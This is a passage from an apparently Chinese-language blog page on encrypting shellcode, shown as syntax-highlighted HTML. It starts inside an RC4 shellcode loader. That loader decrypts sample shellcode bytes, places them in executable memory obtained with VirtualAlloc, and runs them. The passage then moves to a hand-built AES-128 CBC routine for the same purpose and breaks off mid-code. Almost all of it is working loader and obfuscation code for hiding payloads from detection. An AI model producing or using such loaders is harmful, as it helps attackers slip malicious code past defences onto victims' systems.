class="line">    </span><br><span class="line">    <span class="comment">// 密钥调度算法 (KSA)</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) &amp; <span class="number">0xFF</span>;  <span class="comment">// 等同于模256运算</span></span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 伪随机数生成算法 (PRGA)</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">        <span class="comment">// 生成伪随机数，并与数据异或</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> rnd = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>];</span><br><span class="line">        data[k] ^= rnd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>; <span class="comment">// 示例Shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;secretkey&quot;</span>; <span class="comment">// 加密密钥</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">rc4_crypt</span>(shellcode, <span class="built_in">sizeof</span>(shellcode) - <span class="number">1</span>, key, <span class="built_in">sizeof</span>(key) - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配内存并执行</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AES加密Shellcode"><code>AES</code>加密<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AES加密Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AES基本常量与辅助函数 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES S-box</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="comment">/* 0x00 */</span> <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line">    <span class="comment">/* 0x10 */</span> <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line">    <span class="comment">/* 0x20 */</span> <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line">    <span class="comment">/* 0x30 */</span> <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line">    <span class="comment">/* 0x40 */</span> <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="comment">/* 0x50 */</span> <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line">    <span class="comment">/* 0x60 */</span> <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line">    <span class="comment">/* 0x70 */</span> <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line">    <span class="comment">/* 0x80 */</span> <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line">    <span class="comment">/* 0x90 */</span> <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line">    <span class="comment">/* 0xA0 */</span> <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line">    <span class="comment">/* 0xB0 */</span> <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line">    <span class="comment">/* 0xC0 */</span> <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line">    <span class="comment">/* 0xD0 */</span> <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="comment">/* 0xE0 */</span> <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line">    <span class="comment">/* 0xF0 */</span> <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES Rcon数组，用于密钥扩展（注意第一个元素未用）</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> Rcon[<span class="number">11</span>] = &#123; </span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1B</span>,<span class="number">0x36</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// xtime函数：GF(2^8)中乘2运算</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">xtime</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) ^ ((x &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span> ? <span class="number">0x1B</span> : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AES核心函数 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加轮密钥：将状态数组与轮密钥异或</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddRoundKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>], <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> roundKey[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        state[i] ^= roundKey[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节代换：使用S-box对状态数组中每个字节替换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        state[i] = sbox[state[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 行移位：对状态数组的每一行进行循环左移</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShiftRows</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">16</span>];</span><br><span class="line">    <span class="comment">// 第一行不变</span></span><br><span class="line">    temp[<span class="number">0</span>]  = state[<span class="number">0</span>];</span><br><span class="line">    temp[<span class="number">4</span>]  = state[<span class="number">4</span>];</span><br><span class="line">    temp[<span class="number">8</span>]  = state[<span class="number">8</span>];</span><br><span class="line">    temp[<span class="number">12</span>] = state[<span class="number">12</span>];</span><br><span class="line">    <span class="comment">// 第二行左移1位</span></span><br><span class="line">    temp[<span class="number">1</span>]  = state[<span class="number">5</span>];</span><br><span class="line">    temp[<span class="number">5</span>]  = state[<span class="number">9</span>];</span><br><span class="line">    temp[<span class="number">9</span>]  = state[<span class="number">13</span>];</span><br><span class="line">    temp[<span class="number">13</span>] = state[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 第三行左移2位</span></span><br><span class="line">    temp[<span class="number">2</span>]  = state[<span class="number">10</span>];</span><br><span class="line">    temp[<span class="number">6</span>]  = state[<span class="number">14</span>];</span><br><span class="line">    temp[<span class="number">10</span>] = state[<span class="number">2</span>];</span><br><span class="line">    temp[<span class="number">14</span>] = state[<span class="number">6</span>];</span><br><span class="line">    <span class="comment">// 第四行左移3位</span></span><br><span class="line">    temp[<span class="number">3</span>]  = state[<span class="number">15</span>];</span><br><span class="line">    temp[<span class="number">7</span>]  = state[<span class="number">3</span>];</span><br><span class="line">    temp[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">    temp[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(state, temp, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合：对状态数组的每一列进行混合变换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MixColumns</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> col = i * <span class="number">4</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a0 = state[col];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a1 = state[col<span class="number">+1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a2 = state[col<span class="number">+2</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a3 = state[col<span class="number">+3</span>];</span><br><span class="line">        <span class="comment">// 根据GF(2^8)运算实现2和3的乘法</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b0 = <span class="built_in">xtime</span>(a0) ^ (<span class="built_in">xtime</span>(a1) ^ a1) ^ a2 ^ a3;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b1 = a0 ^ <span class="built_in">xtime</span>(a1) ^ (<span class="built_in">xtime</span>(a2) ^ a2) ^ a3;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b2 = a0 ^ a1 ^ <span class="built_in">xtime</span>(a2) ^ (<span class="built_in">xtime</span>(a3) ^ a3);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b3 = (<span class="built_in">xtime</span>(a0) ^ a0) ^ a1 ^ a2 ^ <span class="built_in">xtime</span>(a3);</span><br><span class="line">        state[col]   = b0;</span><br><span class="line">        state[col<span class="number">+1</span>] = b1;</span><br><span class="line">        state[col<span class="number">+2</span>] = b2;</span><br><span class="line">        state[col<span class="number">+3</span>] = b3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展：由16字节的初始密钥扩展得到176字节的轮密钥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">KeyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(roundKeys, key, <span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> bytesGenerated = <span class="number">16</span>;</span><br><span class="line">    <span class="type">int</span> rconIteration = <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (bytesGenerated &lt; <span class="number">176</span>) &#123;</span><br><span class="line">        <span class="comment">// 取前4个字节</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">            temp[i] = roundKeys[bytesGenerated - <span class="number">4</span> + i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每16字节时，进行密钥调度核心变换</span></span><br><span class="line">        <span class="keyword">if</span> (bytesGenerated % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 循环左移1字节</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> t = temp[<span class="number">0</span>];</span><br><span class="line">            temp[<span class="number">0</span>] = temp[<span class="number">1</span>];</span><br><span class="line">            temp[<span class="number">1</span>] = temp[<span class="number">2</span>];</span><br><span class="line">            temp[<span class="number">2</span>] = temp[<span class="number">3</span>];</span><br><span class="line">            temp[<span class="number">3</span>] = t;</span><br><span class="line">            <span class="comment">// S-box代换</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                temp[i] = sbox[temp[i]];</span><br><span class="line">            <span class="comment">// 与Rcon异或</span></span><br><span class="line">            temp[<span class="number">0</span>] ^= Rcon[rconIteration];</span><br><span class="line">            rconIteration++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成新一轮密钥字节</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            roundKeys[bytesGenerated] = roundKeys[bytesGenerated - <span class="number">16</span>] ^ temp[i];</span><br><span class="line">            bytesGenerated++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对单个16字节数据块进行AES-128加密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AES_encrypt_block</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> in[<span class="number">16</span>], <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>], <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(state, in, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始轮密钥加</span></span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, roundKeys);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9轮常规轮变换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> round = <span class="number">1</span>; round &lt; <span class="number">10</span>; round++) &#123;</span><br><span class="line">        <span class="built_in">SubBytes</span>(state);</span><br><span class="line">        <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">        <span class="built_in">MixColumns</span>(state);</span><br><span class="line">        <span class="built_in">AddRoundKey</span>(state, roundKeys + round * <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第10轮（无MixColumns）</span></span><br><span class="line">    <span class="built_in">SubBytes</span>(state);</span><br><span class="line">    <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, roundKeys + <span class="number">10</span> * <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(out, state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- CBC模式下的AES加密函数 ---</span></span><br><span class="line"><span class="comment">// 这里对数据按16字节分组，数据不足16字节时使用零填充</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> data_len, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">char</span> *iv)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算填充后数据长度（16的倍数）</span></span><br><span class="line">    <span class="type">int</span> padded_len = ((data_len + <span class="number">15</span>) / <span class="number">16</span>) * <span class="number">16</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(padded_len);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, data, data_len);</span><br><span class="line">    <span class="comment">// 对不足部分使用0填充</span></span><br><span class="line">    <span class="built_in">memset</span>(buffer + data_len, <span class="number">0</span>, padded_len - data_len);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">KeyExpansion</span>(key, roundKeys);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> prev[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(prev, iv, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按16字节块进行CBC加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; padded_len; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="comment">// 与前一个密文块（或IV）异或</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            buffer[i+j] ^= prev[j];</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">AES_encrypt_block</span>(buffer + i, out, roundKeys);</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer + i, out, <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// 更新prev为当前密文块</span></span><br><span class="line">        <span class="built_in">memcpy</span>(prev, out, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将加密后的数据复制回原data中（注意：可能比原data长，如果data所在空间足够）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data, buffer, padded_len);</span><br><span class="line">    <span 